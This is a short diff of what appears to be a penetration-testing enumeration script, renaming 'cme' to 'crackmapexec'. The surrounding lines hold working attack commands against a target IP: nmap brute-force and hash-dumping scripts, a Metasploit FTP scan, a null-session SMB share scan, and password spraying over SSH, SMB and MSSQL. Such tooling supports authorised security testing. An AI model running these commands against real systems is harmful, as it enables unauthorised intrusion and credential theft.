@@ -62,7 +62,7 @@ nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP" -oN $results_dir/ftp.txt
 msfconsole -q -x "use auxiliary/scanner/ftp/anonymous ; spool $results_dir/ftp_msf.txt; set rhosts $IP; set password anonymous; run ;spool off ; exit"
 
 nmap --script ssh-* -p 22 "$IP" | tee $results_dir/ssh_results
-cme ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/ssh_results.txt
+crackmapexec ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/ssh_results.txt
 nmap -n --script "*telnet* and safe" -p 23 "$IP"  -oN $results_dir/telnet.txt
 nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587 --script-args smtp-ntlm-info.domain=example.com "$IP" | tee $results_dir/smtp.txt
 nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP | tee -a $results_dir/ntp.txt
@@ -126,7 +126,7 @@ crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $re
 #impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results.txt
 #crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results.txt
 #Null scan for smb shares
-cme smb "$IP" -u '' -p '' --shares | tee -a $results_dir/SMB_overall_results.txt
+crackmapexec smb "$IP" -u '' -p '' --shares | tee -a $results_dir/SMB_overall_results.txt
 
 echo -e $RED_LINE
 
@@ -149,7 +149,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP | tee $results_dir/mssql_results.txt
-cme mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results.txt
+crackmapexec mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results.txt
 
 echo -e $RED_LINE
 
